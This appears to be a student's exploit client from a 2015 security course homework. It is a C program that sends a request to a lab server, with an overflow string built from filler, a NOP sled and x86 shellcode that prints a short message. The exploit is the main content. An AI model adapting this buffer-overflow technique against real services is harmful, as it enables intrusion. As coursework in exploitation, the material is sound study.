@@ -1,0 +1,121 @@
+/* file: client1.c class: 18-732, Spring 2015, assignment: Homework 1
+*/
+
+/* Obligatory includes */
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <string.h>
+#include <sys/time.h>
+#include <errno.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/uio.h>
+#include <stdarg.h>
+#include <errno.h>
+#define NOP  0x90
+
+int main(int argc, char** argv)
+{
+	char reqstring[2000] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f\x28\x6e\x48\x55\x90BCDEFGHIJKLMNPPPPPPPPPP;CAP:afsfsfsdfsfsdfsd";
+	int PORTNUM;
+	char SERVER_IP[16];
+
+	int sock, nbytes, i, k, total, s;
+	char request[2000];
+	char recvline[2000];
+	struct sockaddr_in srv;
+
+	
+	/*char prefix[100] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;";
+	char suffix[100] = ";CAP:afsfsfsdfsfsdfsd";
+	char reqstring[2000];
+	memset(reqstring, '\0', 2000);
+	
+	printf("\nPREFIX SIZE: %d",strlen(prefix));
+	memcpy(reqstring, prefix, strlen(prefix));
+
+	
+	for (i = 39; i < 439; i++) {
+		reqstring[i] = NOP;
+	}	
+	for (i = strlen(reqstring)+1, k=0; k < 464; k++, i++) {
+		reqstring[i] = filecreation[k];
+	}
+	memcpy(reqstring + strlen(reqstring), suffix, strlen(suffix));*/
+
+	/* Set up some defaults for if you don't enter any parameters */ 
+	PORTNUM = 18732;
+	strcpy(SERVER_IP, "127.0.0.1");	
+
+	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
+
+        
+	/* Process command line switches */
+	/* Usage: client [-port <port_number>] [-server <server_IP>] */
+	for(i = 1; i < argc; i++){
+		if(argv[i][0] == '-'){
+			if(strcmp(argv[i], "-port") == 0){
+				PORTNUM = atoi(argv[++i]);
+			}else if(strcmp(argv[i], "-server") == 0){
+				strncpy(SERVER_IP, argv[++i],16);
+	
+            }else{
+				printf("Unknown switch \"%s\"\n", argv[i]);
+				exit(1);
+			}
+		}else{
+			printf("Unknown switch \"%s\"\n", argv[i]);
+			exit(1);
+		}
+	}
+
+	/* Fill in the server data structure */
+	memset(&srv, 0, sizeof(srv));
+	srv.sin_family = AF_INET;
+	srv.sin_port = htons(PORTNUM);
+	srv.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+	/* Create the socket */
+	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
+		perror("socket");
+		exit(1);
+	}
+
+	printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);
+
+	/* Connect to the socket */
+	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
+		perror("connect");
+		exit(1);
+	}
+
+	printf("The request is:\n%s\n", reqstring); 
+
+	/* Make the request */
+	strncpy(request, reqstring, 2000 ); 
+	total = 0;
+	s = strlen(request);
+	while( total < s){
+		nbytes = write(sock, request + total, s);
+		total = total + nbytes;
+	} 
+
+	printf("The response of the server is:\n");	
+
+	/* Get and output the response */
+	nbytes = 0;
+	while( (nbytes = read(sock, recvline, 2000)) > 0){
+		recvline[nbytes] = 0;
+		printf("%s\n", recvline); 
+	}
+
+
+	return(0);
+}
+
